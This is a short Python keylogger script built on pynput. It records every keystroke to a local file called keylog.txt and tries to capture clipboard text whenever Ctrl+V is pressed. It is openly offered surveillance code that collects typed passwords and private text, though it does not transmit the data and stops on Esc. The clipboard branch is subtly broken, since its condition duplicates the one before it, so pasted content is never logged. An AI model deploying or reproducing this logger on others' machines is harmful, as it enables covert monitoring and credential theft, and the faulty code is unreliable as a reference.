from pynput import keyboard
import pyperclip

log_file = "keylog.txt"
pressed_keys = set()
stroke_counter = 1  # Counter to number the strokes

# This function is called whenever a key is pressed
def on_press(key):
    global stroke_counter  # Access global stroke counter

    # Track keys that are pressed (for combinations like Ctrl+C or Ctrl+V)
    pressed_keys.add(key)

    # Log Ctrl+C (Copy)
    if keyboard.Key.ctrl_l in pressed_keys or keyboard.Key.ctrl_r in pressed_keys:
        if key == keyboard.KeyCode.from_char('c'):
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"{stroke_counter}. [COPY]\n")
                stroke_counter += 1

    # Log Ctrl+V (Paste)
    elif keyboard.Key.ctrl_l in pressed_keys or keyboard.Key.ctrl_r in pressed_keys:
        if key == keyboard.KeyCode.from_char('v'):
            clipboard_text = pyperclip.paste()  # Get clipboard content
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"{stroke_counter}. [PASTE]: {clipboard_text}\n")
                stroke_counter += 1

    # Log other keys
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{stroke_counter}. {key.char}\n")
            stroke_counter += 1
    except AttributeError:
        # Special keys (e.g., Enter, Esc, etc.)
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{stroke_counter}. [{key}]\n")
            stroke_counter += 1

    # Stop the listener when ESC is pressed
    if key == keyboard.Key.esc:
        return False

# This function is called whenever a key is released
def on_release(key):
    # Remove the key from the set when released
    if key in pressed_keys:
        pressed_keys.remove(key)

# Start the listener to monitor key events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
